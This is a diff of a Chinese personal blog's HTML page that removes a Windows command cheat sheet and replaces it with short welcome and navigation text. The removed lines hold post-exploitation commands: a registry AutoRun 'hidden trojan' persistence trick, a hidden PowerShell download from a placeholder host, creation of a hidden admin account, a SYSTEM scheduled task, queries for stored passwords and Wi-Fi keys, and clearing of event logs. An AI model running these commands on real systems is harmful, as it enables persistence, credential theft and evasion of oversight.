@@ -120,7 +120,7 @@
 <meta property="og:url" content="http://yoursite.com/2017/08/03/start/index.html">
 <meta property="og:site_name" content="北门 blog">
 <meta property="og:description" content="夫子曾经说过:如果只剩下最后的方法，那必然就是最好的方法   麻烦各位不要问我夫子是谁,他只是我臆想出来的一个人。博客导航栏功能概括">
-<meta property="og:updated_time" content="2017-08-09T13:27:40.932Z">
+<meta property="og:updated_time" content="2017-08-11T15:48:21.368Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="博客初启">
 <meta name="twitter:description" content="夫子曾经说过:如果只剩下最后的方法，那必然就是最好的方法   麻烦各位不要问我夫子是谁,他只是我臆想出来的一个人。博客导航栏功能概括">
@@ -352,8 +352,8 @@
               <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/技术研究/" itemprop="url" rel="index">
-                    <span itemprop="name">技术研究</span>
+                  <a href="/categories/博主有话说/" itemprop="url" rel="index">
+                    <span itemprop="name">博主有话说</span>
                   </a>
                 </span>
 
@@ -399,41 +399,11 @@
 
 
 <p>麻烦各位不要问我夫子是谁,他只是我臆想出来的一个人。<br>博客导航栏功能概括<br><a id="more"></a></p>
-<h3 id="达客阁"><a href="#达客阁" class="headerlink" title="达客阁"></a>达客阁</h3><p>隐藏木马：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CreateObject(<span class="string">"WScript.Shell"</span>).RegWrite <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun"</span>, <span class="string">"calc.exe"</span>,<span class="string">"REG_SZ"</span></div></pre></td></tr></table></figure></p>
-<p>注册表添加这个值后，当运行cmd时，先运行你的计算器，命令行下cmd /k参数的原理。</p>
-<p>列出ie代理设置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg query <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</span></div></pre></td></tr></table></figure></p>
-<p>下载远程文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(<span class="string">'http://www.xxx.com/lcx.1'</span>,<span class="string">'d:\\3.txt'</span>)</div></pre></td></tr></table></figure></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bitsadmin /rawreturn /transfer getfile http://127.0.0.1:8080/test.zip F:\123.zip</div></pre></td></tr></table></figure>
-<p>添加隐藏账号：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net user <span class="built_in">test</span>$ <span class="built_in">test</span> /add       添加<span class="built_in">test</span>用户密码为<span class="built_in">test</span>的隐藏账号</div><div class="line">net localgroup administrators <span class="built_in">test</span>$ /add 把<span class="built_in">test</span>添加到系统用户组</div></pre></td></tr></table></figure></p>
-<p>列出更新的补丁：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic qfe list full /format:htable &gt; hotfixes.htm</div><div class="line">wmic qfe get description,installedOn</div></pre></td></tr></table></figure></p>
-<p>在d盘根目录递归查找login.html文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /d d: &amp;&amp; dir login.html /a<span class="_">-d</span>/b/s</div></pre></td></tr></table></figure></p>
-<p>进入某盘符的某个目录下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d: &amp; <span class="built_in">cd</span> d:/Clover</div></pre></td></tr></table></figure></p>
-<p>重新打开一个cmd运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cmd /c  whoami</div></pre></td></tr></table></figure></p>
-<p>添加计划任务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">schtasks.exe  /Create /RU <span class="string">"SYSTEM"</span> /SC MINUTE /MO       </div><div class="line">45 /TN FIREWALL /TR <span class="string">"c:/1.ex    e"</span> /ED 2016/12/12</div><div class="line">可以把RU里面的system改为自己的账户名称，这样就可以执行添加计划任务了</div></pre></td></tr></table></figure></p>
-<p>进程相关：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tasklist   查看进程</div><div class="line">taskkill /im 进程名称</div><div class="line">taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</div></pre></td></tr></table></figure></p>
-<p>查看windows系统未打的漏洞补丁：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> KB2829361=MS13-046&amp;<span class="built_in">set</span> KB2830290=MS13-046&amp;<span class="built_in">set</span> KB2667440=MS12-020&amp;<span class="built_in">set</span> KB2667402=MS12-020&amp;<span class="built_in">set</span> KB3124280=MS16-016&amp;<span class="built_in">set</span> KB3077657=MS15-077&amp;<span class="built_in">set</span> KB3045171=MS15-051&amp;<span class="built_in">set</span> KB2592799=MS11-080&amp;<span class="built_in">set</span> KB952004=MS09-012 PR&amp;<span class="built_in">set</span> KB956572=MS09-012 巴西烤肉&amp;<span class="built_in">set</span> KB970483=MS09-020 iis6&amp;<span class="built_in">set</span> KB2124261=MS10-065 ii7&amp;<span class="built_in">set</span> KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) <span class="keyword">do</span> @<span class="built_in">type</span> a.txt|@find /i <span class="string">"%i"</span>||@<span class="built_in">echo</span> %%i% Not Installed!)&amp;del /f /q /a a.txt</div></pre></td></tr></table></figure></p>
-<p>获取保存在注册表中密码的键值：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG query HKCU  /v <span class="string">"pwd"</span> /s  <span class="comment">#pwd可替换为password \ HKCU 可替换为HKCR</span></div></pre></td></tr></table></figure></p>
-<p>识别开机启动的程序:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic startup list full</div></pre></td></tr></table></figure></p>
-<p>识别网卡中的IP与Mac：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic nicconfig get ipaddress,macaddress</div></pre></td></tr></table></figure></p>
-<p>查看共享服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic share get name,path</div><div class="line">net share</div></pre></td></tr></table></figure></p>
-<p>查看系统中日志的位置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic nteventlog get path,filename,writeable</div></pre></td></tr></table></figure></p>
-<p>删除日志：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wevtutil cl <span class="string">"windows powershell"</span></div><div class="line">wevtutil cl <span class="string">"security"</span></div><div class="line">wevtutil cl <span class="string">"system"</span></div></pre></td></tr></table></figure></p>
-<p>运行的服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sc query <span class="built_in">type</span>= service</div><div class="line">net start</div></pre></td></tr></table></figure></p>
-<p>安装的软件以及版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic product get name,version</div></pre></td></tr></table></figure></p>
-<p>查看某个进程的详细情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic process <span class="built_in">where</span> name=<span class="string">"chrome.exe"</span> list full</div></pre></td></tr></table></figure></p>
-<p>显示系统中曾连接过的无线密码：(以管理员身份运行)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">netsh wlan show profiles</div><div class="line">netsh wlan show profiles name=<span class="string">"profiles的名字"</span> key=clear</div></pre></td></tr></table></figure></p>
-<p>一键获取：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> /f <span class="string">"skip=9 tokens=1,2 delims=:"</span> %i <span class="keyword">in</span> (<span class="string">'netsh wlan show profiles'</span>) <span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> | netsh wlan show profiles %j key=clear</div></pre></td></tr></table></figure></p>
-<p>查看是否为虚拟机：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic bios list full | find /i <span class="string">"vmware"</span></div></pre></td></tr></table></figure></p>
-<p>是否支持powershell:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> defined PSModulePath (<span class="built_in">echo</span> 支持powershell) <span class="keyword">else</span> (<span class="built_in">echo</span> 不支持powershell)</div></pre></td></tr></table></figure></p>
-<p>电脑产品编号与型号信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic baseboard get  Product,SerialNumber</div></pre></td></tr></table></figure></p>
-<h3 id="CMD局域网命令"><a href="#CMD局域网命令" class="headerlink" title="CMD局域网命令"></a>CMD局域网命令</h3><p>arp -a 列出本网段内所有活跃的IP地址<br>arp -a 加对方IP是查对方的MAC地址<br>arp -s （ip + mac）绑定mac与ip地址<br>arp -d （ip + mac）解绑mac与ip地址</p>
-<p>net view                  ——&gt; 查询同一域内机器列表<br>net view /domain    ——&gt; 查询域列表<br>net view /domain:domainname  —–&gt; 查看workgroup域中计算机列表</p>
-<p>ipconfig /all            ——&gt; 查询本机IP段，所在域等<br>ipconfig /release<br>ipconfig /renew    重新获取Ip地址</p>
-<p>telnet ip 端口号：尝试能否打开链接远程主机端口 nbtstat -a 加对方IP查对方的主机名<br>tracert 主机名   得到IP地址</p>
-<p>netstat -a -n<br>netstat -an | find “3389”<br>netstat -a查看开启哪些端口<br>netstat -n查看端口的网络连接情况<br>netstat -v查看正在进行的工作<br>netstat -p tcp/ip查看某协议使用情况<br>netstat -s 查看正在使用的所有协议使用情况</p>
-<p>nbtstat -n 获取NetBIOS<br>nslookup 域名   查询域名对应的ip</p>
-<h3 id="DO常用快捷键"><a href="#DO常用快捷键" class="headerlink" title="DO常用快捷键"></a>DO常用快捷键</h3><p>mspaint　　画图工具<br>calc　　计算机<br>notepad　　记事本<br>taskmgr　　任务管理器<br>osk　　打开屏幕键盘<br>gpedit.msc　　组策略<br>services.msc　　本地服务<br>compmgmt.msc　　计算机管理<br>devmgmt.msc　　设备管理器<br>winver　　查看系统版本<br>magnify　　放大镜实用程序<br>eventvwr　　事件查看器<br>Regedit　　打开注册表<br>resmon　　资源监视器<br>WMIC BIOS get releasedate　　查看电脑生产日期<br>mstsc -f　　远程连接（可以全屏）</p>
-<p><em>本文将持续收集更新，欢迎大家留言补充！</em></p>
+<h3 id="达客阁"><a href="#达客阁" class="headerlink" title="达客阁"></a>达客阁</h3><p>一个你巅峰阅读量的文章：</p>
+<pre><code class="bash只有你想不到没有我做不到，忍不住想自我夸奖一波...略略略，博主年龄还很小&quot;">
+</code></pre>
+<h3 id="导航集合所有的集合各种黑客白帽用到的工具…当然…你们是不是绿帽子…我就不知道啦，哈哈，这个导航我做了好久"><a href="#导航集合所有的集合各种黑客白帽用到的工具…当然…你们是不是绿帽子…我就不知道啦，哈哈，这个导航我做了好久" class="headerlink" title="导航集合所有的集合各种黑客白帽用到的工具…当然…你们是不是绿帽子…我就不知道啦，哈哈，这个导航我做了好久"></a>导航集合所有的集合各种黑客白帽用到的工具…当然…你们是不是绿帽子…我就不知道啦，哈哈，这个导航我做了好久</h3><p>，也整合了好久</p>
+<h3 id="留言"><a href="#留言" class="headerlink" title="留言"></a>留言</h3><p>爱我的你们快来留留言，有钱的捧个钱场，没钱的捧个人场，谢谢各位啦。</p>
 
       
     </div>
@@ -451,7 +421,7 @@
   <p><span>本文标题:</span><a href="/2017/08/03/start/">博客初启</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 北门 的个人博客">北门</a></p>
   <p><span>发布时间:</span>2017年08月03日 - 21:08</p>
-  <p><span>最后更新:</span>2017年08月09日 - 21:08</p>
+  <p><span>最后更新:</span>2017年08月11日 - 23:08</p>
   <p><span>原始链接:</span><a href="/2017/08/03/start/" title="博客初启">http://yoursite.com/2017/08/03/start/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/08/03/start/"  aria-label="复制成功！"></i></span>
   </p>
@@ -573,7 +543,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-count">2</span>
                 <span class="site-state-item-name">Kategorien</span>
               </a>
             </div>
@@ -727,7 +697,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#达客阁"><span class="nav-number">1.</span> <span class="nav-text">达客阁</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CMD局域网命令"><span class="nav-number">2.</span> <span class="nav-text">CMD局域网命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DO常用快捷键"><span class="nav-number">3.</span> <span class="nav-text">DO常用快捷键</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#达客阁"><span class="nav-number">1.</span> <span class="nav-text">达客阁</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#导航集合所有的集合各种黑客白帽用到的工具…当然…你们是不是绿帽子…我就不知道啦，哈哈，这个导航我做了好久"><span class="nav-number">2.</span> <span class="nav-text">导航集合所有的集合各种黑客白帽用到的工具…当然…你们是不是绿帽子…我就不知道啦，哈哈，这个导航我做了好久</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#留言"><span class="nav-number">3.</span> <span class="nav-text">留言</span></a></li></ol></div>
             
           </div>
         </section>
